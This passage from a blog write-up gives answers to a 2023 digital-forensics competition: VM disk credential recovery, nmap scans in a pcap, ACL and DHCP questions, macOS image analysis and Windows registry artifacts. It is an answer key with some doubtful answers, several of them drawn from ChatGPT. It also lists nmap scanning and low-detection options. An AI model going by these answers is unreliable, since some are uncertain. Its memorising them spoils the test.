srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>也可以在取证大师中找到</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca8.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca5.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="13-参考server文件夹下的-meiya_vpnvmdk-回答以下题目这个访问服务器的openvpn帐户密码是多少提示请用大写字母与阿拉伯数字作答"><a class="markdownIt-Anchor" href="#13-参考server文件夹下的-meiya_vpnvmdk-回答以下题目这个访问服务器的openvpn帐户密码是多少提示请用大写字母与阿拉伯数字作答">#</a> 13. 参考 Server 文件夹下的 ’ Meiya_VPN.vmdk ’ 回答以下题目，这个访问服务器的 “openvpn” 帐户密码是多少？提示：请用大写字母与阿拉伯数字作答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLFAG6L6DSSC</span><br></pre></td></tr></table></figure><p>搜索 openvpn 在 vpn1.txt 可以找到</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca6.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>或者在 <code>/usr/local/openvpn_as</code>  目录找到 <code>init.log</code> ，为 openvpn 的初始化日志，在其中筛选 password</p><p><code>cat init.log | grep password</code></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca9.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="14-参考server文件夹下的-meiya_vpnvmdk-回答以下题目在这个访问服务器中user1账户之间的连接所使用的加密算法密码是什么"><a class="markdownIt-Anchor" href="#14-参考server文件夹下的-meiya_vpnvmdk-回答以下题目在这个访问服务器中user1账户之间的连接所使用的加密算法密码是什么">#</a> 14. 参考 Server 文件夹下的 ’ Meiya_VPN.vmdk ' 回答以下题目，在这个访问服务器中，“User1” 账户之间的连接所使用的加密算法（密码）是什么？</h5><p>A. Blowfish-CBC</p><p>B. 3DES-CBC</p><p>C. AES-128-GCM</p><p>D. AES-256-CBC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>取证大师搜索 user1，在 User1.ovpn 文件中找到</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca10.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca11.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>也可以仿真下来找找在 downloads 里</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca12.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="15-参考-网络题目pcapng-文件回答以下题目给出正在进行nmap扫描的计算机互联网协议地址提示-以ipv4格式给出答案"><a class="markdownIt-Anchor" href="#15-参考-网络题目pcapng-文件回答以下题目给出正在进行nmap扫描的计算机互联网协议地址提示-以ipv4格式给出答案">#</a> 15. 参考’ 网络题目.pcapng ’ 文件回答以下题目，给出正在进行 Nmap 扫描的计算机互联网协议地址？提示：以 IPV4 格式给出答案</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.186.132</span><br></pre></td></tr></table></figure><p>答案是 192.168.226.132？？？？？？不懂</p><h5 id="16-参考网络题目pcapng文件回答以下题目有多少个nmap扫描正在同时进行提示请给出阿拉伯数字作答"><a class="markdownIt-Anchor" href="#16-参考网络题目pcapng文件回答以下题目有多少个nmap扫描正在同时进行提示请给出阿拉伯数字作答">#</a> 16. 参考’网络题目.pcapng’文件回答以下题目，有多少个 Nmap 扫描正在同时进行？提示：请给出阿拉伯数字作答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p>192.168.186.132 扫 8.8.8.8（TCP）</p><p>192.168.186.132 扫 45.33.32.156（UDP）</p><h5 id="17-参考网络题目pcapng文件回答以下题目当计算机正在扫瞄8888namp相关的指令是什么"><a class="markdownIt-Anchor" href="#17-参考网络题目pcapng文件回答以下题目当计算机正在扫瞄8888namp相关的指令是什么">#</a> 17. 参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄 8.8.8.8，namp 相关的指令是什么？</h5><p>A. nmap -sT 8.8.8.8</p><p>B. nmap -sU 8.8.8.8</p><p>C. nmap -sn -PR 8.8.8.8</p><p>D. nmap -sn -PU 8.8.8.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>gpt 回答</p><blockquote><p>TCP SYN 扫描（-sS）：</p><p>Nmap 发送的 SYN 数据包类似于 TCP 三次握手中的初始 SYN 数据包。<br>目标端口打开时，目标主机会回应一个 SYN/ACK 数据包。<br>目标端口关闭时，目标主机会发送 RST（复位）数据包。<br>Nmap 在收到 SYN/ACK 后不会完成握手，而是发送 RST 以终止连接。<br>TCP 全连接扫描（-sT）：</p><p>Nmap 发送标准的三次握手数据包（SYN、SYN/ACK、ACK），完成 TCP 连接。<br>如果目标端口打开，Nmap 会建立完整的 TCP 连接，并立即关闭连接。<br>如果目标端口关闭，Nmap 会收到 RST 响应。<br>UDP 扫描（-sU）：</p><p>Nmap 发送空的 UDP 数据包到目标端口。<br>如果端口关闭，通常会收到一个 ICMP “端口不可达” 的数据包（类型 3，代码 3）。<br>如果端口打开且没有响应，则通常没有回包，这让 UDP 扫描变得更难以分析。<br>TCP ACK 扫描（-sA）：</p><p>Nmap 发送带有 ACK 标志的数据包，而不关心目标端口是否开放。<br>目标主机会根据是否存在防火墙来决定是否回应 RST 包。如果有防火墙，可能会丢弃数据包而无响应。<br>FIN 扫描（-sF）：</p><p>Nmap 发送带有 FIN 标志的数据包，而不是 SYN。<br>如果端口关闭，目标主机通常会响应 RST。<br>如果端口打开，理论上不应有任何响应。<br>Xmas 扫描（-sX）：</p><p>Nmap 发送具有 FIN、PSH 和 URG 标志的特殊数据包，类似于 “圣诞树” 的形状（故名）。<br>响应与 FIN 扫描类似。<br>NULL 扫描（-sN）：</p><p>Nmap 发送一个没有设置任何 TCP 标志位的空数据包。<br>关闭的端口通常会返回 RST，打开的端口则不应有响应。</p></blockquote><p>可以看到 tcp 扫描是 - sT</p><h5 id="18-参考网络题目pcapng文件回答以下题目当计算机正在扫瞄453332156namp相关的指令是什么"><a class="markdownIt-Anchor" href="#18-参考网络题目pcapng文件回答以下题目当计算机正在扫瞄453332156namp相关的指令是什么">#</a> 18. 参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄 45.33.32.156，namp 相关的指令是什么？</h5><p>A. nmap -sT 45.33.32.156</p><p>B. nmap -sU 45.33.32.156</p><p>C. nmap -sn -45.33.32.156</p><p>D. nmap -sn -45.33.32.156</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="19-单选题-国强被指派设定一个dhcp服务器该服务器需借出最后100个的ip地址以下哪个ip地址会是被借出的ip地址1分"><a class="markdownIt-Anchor" href="#19-单选题-国强被指派设定一个dhcp服务器该服务器需借出最后100个的ip地址以下哪个ip地址会是被借出的ip地址1分">#</a> 19. [单选题] 国强被指派设定一个 DHCP 服务器，该服务器需借出最后 100 个的 IP 地址，以下哪个 IP 地址会是被借出的 IP 地址？(1 分)</h5><p>A. 10.1.4.255</p><p>B. 10.1.4.100</p><p>C. 10.1.4.254</p><p>D. 10.1.4.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>gpt 回答</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">设定 DHCP 服务器借出最后 100 个 IP 地址时，通常指的是从某个范围的 IP 地址池的最后 100 个可用地址开始分配。假设 DHCP 服务器分配的 IP 地址在 10.1.4.0/24 网段中，该网段的有效 IP 地址范围是 10.1.4.1 到 10.1.4.254，其中 10.1.4.255 是广播地址，不能分配。</span><br><span class="line"></span><br><span class="line">所以，最后 100 个 IP 地址将从 10.1.4.155（254-100+1=155）到 10.1.4.254。</span><br><span class="line"></span><br><span class="line">根据选项，唯一属于最后 100 个可用 IP 地址范围内的是 C. 10.1.4.254。</span><br><span class="line"></span><br><span class="line">答案：C. 10.1.4.254。</span><br></pre></td></tr></table></figure><h5 id="20-单选题-以下那个协议是属于tcpip协议1分"><a class="markdownIt-Anchor" href="#20-单选题-以下那个协议是属于tcpip协议1分">#</a> 20. [单选题] 以下那个协议是属于 TCP/IP 协议？(1 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca13.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>A. i &amp; iii</p><p>B. ii &amp; iv</p><p>C. 所有皆是 (All answers belong to TCP/IP protocol)</p><p>D. 所有皆否 (All answers don’t belong to TCP/IP protocol)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca14.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>来源：<a href="https://www.cnblogs.com/crazymakercircle/p/14499211.html">https://www.cnblogs.com/crazymakercircle/p/14499211.html</a></p><h5 id="21-单选题-浩贤为一间公司的网络管理员他需要把一个路由器作出以下设定现在浩贤把路由器作以下设定志伟是浩贤的主管他发现浩贤的设定错误浩贤应作怎样的更正2分"><a class="markdownIt-Anchor" href="#21-单选题-浩贤为一间公司的网络管理员他需要把一个路由器作出以下设定现在浩贤把路由器作以下设定志伟是浩贤的主管他发现浩贤的设定错误浩贤应作怎样的更正2分">#</a> 21. [单选题] 浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定，现在浩贤把路由器作以下设定，志伟是浩贤的主管，他发现浩贤的设定错误，浩贤应作怎样的更正？(2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca15.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>A. 'access-list 123 permit tcp any eq ftp any ’ 更正为 (change) 'access-list 123 permit udp any eq ftp any ’<br>B. 'access-list 122 permit tcp host 192.168.26.3 eq www any ’ 更正为 (change) 'access-list 122 permit udp host 192.168.26.3 eq www any ’<br>C. 删除 (Delete)‘access-list 120 deny tcp any any’ 与’access-list 119 deny udp any any’<br>D. 删除 (Delete)'access-list 123 permit tcp any eq ftp any ’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>1.ACL 规则的顺序：路由器会按照 ACL 中的顺序检查每一条规则，一旦找到匹配的规则，就会停止检查，因此更具体的规则应该放在前面，更通用的规则应该放在后面。</p><p>2. 如果一个数据报没有匹配任何规则，路由器会默认允许该数据包通过。</p><p>119 和 120 两个规则直接把服务器断网了，所以删掉。</p><h5 id="22-单选题-根据以下ping指令的结果你会估计192168186132是哪一个操作系统2分"><a class="markdownIt-Anchor" href="#22-单选题-根据以下ping指令的结果你会估计192168186132是哪一个操作系统2分">#</a> 22. [单选题] 根据以下 ping 指令的结果，你会估计 192.168.186.132 是哪一个操作系统？(2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca16.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>A. Linux</p><p>B. Windows XP</p><p>C. Windows 7</p><p>D. iOS 12.4 (Cisco Routers)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>ttl=64 即 linux</p><h5 id="23-单选题-当使用nmap扫瞄目标后nmap内出现以下信息应用哪一个指令找出开放的端口2分"><a class="markdownIt-Anchor" href="#23-单选题-当使用nmap扫瞄目标后nmap内出现以下信息应用哪一个指令找出开放的端口2分">#</a> 23. [单选题] 当使用 nmap 扫瞄目标后，nmap 内出现以下信息，应用哪一个指令找出开放的端口？(2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca17.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>A. nmap -sT</p><p>B. nmap -sN</p><p>C. nmap -sX</p><p>D. nmap -Pn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><h5 id="24单选题-以下哪一个nmap指令可以减低被侦测的可能性2分"><a class="markdownIt-Anchor" href="#24单选题-以下哪一个nmap指令可以减低被侦测的可能性2分">#</a> 24.[单选题] 以下哪一个 Nmap 指令可以减低被侦测的可能性？(2 分)</h5><p>A. nmap -sT -O -T5</p><p>B. nmap -sT -O -T0</p><p>C. nmap -sU</p><p>D. nmap -A --host-timeout 99-T1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>-T0 是最慢的扫描</p><h5 id="25-单选题-apple计算机的硬盘可以使用以下分区方案1分"><a class="markdownIt-Anchor" href="#25-单选题-apple计算机的硬盘可以使用以下分区方案1分">#</a> 25. [单选题] Apple 计算机的硬盘可以使用以下分区方案：(1 分)</h5><p>A. Apple Partition Map</p><p>B. GUID Partition Table</p><p>C. Master Boot Record</p><p>D. All of the above</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>看看 gpt 的回答</p><blockquote><p>Apple 计算机的硬盘可以支持多种分区方案：</p><ul><li><strong>Apple Partition Map (APM)</strong>：早期 PowerPC 架构的 Mac 计算机使用的分区方案，现代 Intel 或 Apple Silicon Mac 一般不使用。</li><li><strong>GUID Partition Table (GPT)</strong>：现代 Mac 系统默认的分区方案，适用于较新设备。</li><li><strong>Master Boot Record (MBR)</strong>：用于兼容一些旧系统或 Windows 环境，支持在 Mac 上创建，但不是 macOS 默认的分区方案。</li></ul></blockquote><p>所以选 D</p><h5 id="26-单选题-mac-osimg-文件中可以找到多少个符号链接1分"><a class="markdownIt-Anchor" href="#26-单选题-mac-osimg-文件中可以找到多少个符号链接1分">#</a> 26. [单选题] ‘Mac OS.img’ 文件中可以找到多少个符号链接？(1 分)</h5><p>A. 0</p><p>B. 1</p><p>C. 2</p><p>D. 3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>挂载到 mac 虚拟机</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca18.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>搜索可知<a href="https://blog.csdn.net/qq_34037455/article/details/120249841"> macOS 上的符号链接 Symlink 是什么，以及该怎么使用_symbolic links-CSDN 博客</a>:</p><p>macOS 上的符号链接 Symlink 是什么，以及该怎么使用？</p><p>符号链接（Symbolic links），也被称为 Symlinks，是一类特殊的文件，指向系统上的其他文件或者目录，可以认为是 macOS 上的一种比较先进的别名（aliase）。</p><p>由图可知只有一个 alias, 即一个连接符号</p><h5 id="27-单选题-在mac-osimg-档中使用了哪种分区方案2分"><a class="markdownIt-Anchor" href="#27-单选题-在mac-osimg-档中使用了哪种分区方案2分">#</a> 27. [单选题] 在’Mac OS.img’ 档中使用了哪种分区方案？(2 分)</h5><p>A. Apple Partition Map</p><p>B. GUID Partition Table</p><p>C. Master Boot Record</p><p>D. HFS+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca19.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a19"></p><p>取证大师摘要</p><h5 id="28-单选题-mac-osimg-档的文件系统的正确描述是什么1分"><a class="markdownIt-Anchor" href="#28-单选题-mac-osimg-档的文件系统的正确描述是什么1分">#</a> 28. [单选题] ‘Mac OS.img’ 档的文件系统的正确描述是什么？(1 分)</h5><p>A. HFS+（已启用日志记录）</p><p>B. HFS+（已启用区分大小写）</p><p>C. HFS+（已启用日志记录和区分大小写）</p><p>D. APFS (已启用区分大小写）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca20.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a20"></p><p>挂载到 mac 虚拟机查看简介</p><h5 id="29-填空题-从文件carrtfd中删除了哪个文件提示答案需包括副文件名并以全小写字母作答例如-answerdocx-1分"><a class="markdownIt-Anchor" href="#29-填空题-从文件carrtfd中删除了哪个文件提示答案需包括副文件名并以全小写字母作答例如-answerdocx-1分">#</a> 29. [填空题] 从文件 “Car.rtfd” 中删除了哪个文件？提示：答案需包括副文件名，并以全小写字母作答，例如 answer.docx (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yeah.jpg</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca21.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a21"></p><blockquote><p><strong> <code>.DocumentRevisions-V100</code> </strong> 是 macOS 中的一个隐藏系统文件夹，用于存储文件的版本历史。它被引入以支持 “版本控制” 功能，允许用户在应用程序（如 TextEdit、Pages、Keynote 等）中查看和恢复文档的旧版本。</p><h3 id="主要功能和作用"><a class="markdownIt-Anchor" href="#主要功能和作用">#</a> 主要功能和作用：</h3><ol><li><strong>版本控制</strong>：当用户编辑文档时，macOS 会自动创建快照并存储在 <code>.DocumentRevisions-V100</code>  中。用户可以通过支持版本控制的应用程序查看文档的历史记录，恢复到某个之前的版本。</li><li><strong>临时存储</strong>：这个文件夹还可能包含未保存的更改内容，防止在程序崩溃或系统故障时丢失数据。</li><li><strong>存储位置</strong>：通常位于系统磁盘的根目录中，并且是一个隐藏文件夹。macOS 会自动管理它，用户通常不需要手动处理其中的内容。</li><li><strong>清理</strong>：由于其作用， <code>.DocumentRevisions-V100</code>  可能会占用一定的存储空间，特别是在长时间没有清理的情况下。macOS 会自动清理旧的文档版本，但如果需要释放空间，可以通过终端或磁盘清理工具在不影响系统的情况下安全删除它。</li></ol></blockquote><p>由此可知被删除的文件就是 yeah.jpg</p><h5 id="30-填空题-请提供mac-osimg-映像文件被fsck命令检查的具体时间-1分"><a class="markdownIt-Anchor" href="#30-填空题-请提供mac-osimg-映像文件被fsck命令检查的具体时间-1分">#</a> 30. [填空题] 请提供’Mac OS.img’ 映像文件被 “fsck” 命令检查的具体时间。(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20230713-082435</span><br></pre></td></tr></table></figure><p>看了别的师傅的 wp 结合 chatgpt</p><blockquote><p>在 macOS 中，<strong> <code>fsck</code> （file system consistency check）</strong> 是一种用于检查和修复文件系统的工具。当 <code>fsck</code>  运行时，特别是检查或修复 HFS+（Hierarchical File System Plus）卷时，它会对文件系统的内部数据结构进行检查和更改，其中包括系统使用的 “Private Data” 文件。这可能导致文件系统元数据的修改时间与 <code>fsck</code>  检查时间产生关联。</p><h3 id="原因分析"><a class="markdownIt-Anchor" href="#原因分析">#</a> 原因分析：</h3><ol><li><strong>HFS+ Private Data 文件的修改</strong>：<ul><li>在 HFS + 文件系统中，Private Data 区域用于存储系统文件、日志信息、以及其他系统相关的隐藏文件或目录（如 <code>.journal</code> 、 <code>.DocumentRevisions-V100</code>  等）。这些文件可能会记录文件系统的状态信息。</li><li><code>fsck</code>  在执行修复时，可能会修改这些数据以确保文件系统的一致性。因此，运行 <code>fsck</code>  会更新与 HFS+ Private Data 相关文件的修改日期。</li></ul></li><li><strong>与 <code>.img</code>  文件的关联</strong>：<ul><li>当 <code>Mac OS.img</code>  文件（一个磁盘映像文件）被挂载或修复时，macOS 会将其视为一个 HFS + 卷进行检查，这可能会在挂载或修复过程中修改 Private Data 区域，从而更新元数据。</li><li>这种情况下， <code>fsck</code>  检查的时间可能会与该磁盘映像文件中 Private Data 的修改时间匹配，因为 <code>fsck</code>  执行的检查或修复会直接影响到文件系统的元数据记录。</li></ul></li><li><strong>时间戳关联</strong>：<ul><li>macOS 会记录每个文件和目录的访问、修改和创建时间。当 <code>fsck</code>  检查和修复操作时，它可能会更新这些时间戳，尤其是涉及文件系统的元数据文件时。</li></ul></li></ol><p>总的来说， <code>fsck</code>  对 HFS + 卷的检查和修复操作，特别是当卷中存在与系统相关的 Private Data 文件时，通常会导致修改时间与检查时间接近或一致。这也是 <code>fsck</code>  对 <code>Mac OS.img</code>  文件执行操作时与 HFS+ Private Data 修改时间相关的原因。</p></blockquote><p>大概意思是 fsck 命令会检查和修复文件系统，所以会修改 HFS+ Private Data 文件，结合 X-way 可以看到修改文件的时间需要修改时区</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Cimage-20241026001354490.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Cimage-20241026001354490.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20241026001354490"></p><p>所以是 20230713-082435</p><h5 id="31-单选题-在-dmg-档中删除了多少个文件1分"><a class="markdownIt-Anchor" href="#31-单选题-在-dmg-档中删除了多少个文件1分">#</a> 31. [单选题] 在 .dmg 档中删除了多少个文件？(1 分)</h5><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><code>.Trashes</code>  是 MacOS 的废纸篓，相当于 Windows 的回收站 <code>$Recycle.bin</code> ，所以看一下 Trashes 就知道了</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca23.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a23"></p><p>所以是 4 个</p><h5 id="32-填空题-elvis-chui-总共登入过该计算机多少次根据-window-artifactse01-内的windows-注册表记录-1分"><a class="markdownIt-Anchor" href="#32-填空题-elvis-chui-总共登入过该计算机多少次根据-window-artifactse01-内的windows-注册表记录-1分">#</a> 32. [填空题] Elvis Chui 总共登入过该计算机多少次？根据 ‘Window Artifacts.E01’ 内的 Windows 注册表记录 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca24.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a24"></p><p>查看用户信息里的 Elvis Chui 可以看到登录次数 11 次</p><h5 id="33-单选题-该计算机的操作系统是在哪一个时区1分"><a class="markdownIt-Anchor" href="#33-单选题-该计算机的操作系统是在哪一个时区1分">#</a> 33. [单选题] 该计算机的操作系统是在哪一个时区？(1 分)</h5><p>A. UTC +4</p><p>B. UTC +8</p><p>C. UTC -8</p><p>D. UTC -4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca25.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca25.png" 